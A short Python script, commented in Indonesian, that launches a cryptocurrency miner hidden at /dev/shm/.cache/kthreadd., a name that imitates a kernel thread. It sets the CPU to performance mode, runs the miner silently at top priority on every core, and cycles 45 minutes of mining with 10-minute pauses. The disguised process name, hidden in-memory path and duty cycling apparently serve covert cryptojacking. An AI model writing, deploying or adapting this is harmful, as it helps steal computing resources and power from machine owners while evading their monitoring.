import os
import time
import sys
import signal

# CONFIG
MINER_PATH = "/dev/shm/.cache/kthreadd."  # Lokasi miner
MINER_NAME = "kthreadd."  # Nama miner buat kill
MINING_TIME = 2700  # 45 menit
REST_TIME = 600  # 10 menit

def set_cpu_performance():
    """Mengatur CPU ke mode performance agar tidak turun clock speed-nya."""
    os.system("echo performance | tee /sys/devices/system/cpu/cpu*/cpufreq/scaling_governor")

def kill_miner():
    """Menghentikan proses miner berdasarkan nama."""
    os.system(f"pkill -f {MINER_NAME}")

def start_miner():
    """Menjalankan miner dengan prioritas tinggi dan semua core CPU."""
    print("🚀 Jalanin miner dengan full performa...")
    set_cpu_performance()
    command = f"nohup bash -c 'nice -n -20 taskset -c 0-$(($(nproc)-1)) {MINER_PATH}' > /dev/null 2>&1 &"
    os.system(command)
    time.sleep(5)

def main():
    while True:
        start_miner()
        time.sleep(MINING_TIME)
        kill_miner()
        time.sleep(REST_TIME)

def sigint_handler(sig, frame):
    """Menangani Ctrl+C agar miner dihentikan sebelum keluar."""
    kill_miner()
    sys.exit(0)

signal.signal(signal.SIGINT, sigint_handler)

if __name__ == "__main__":
    main()
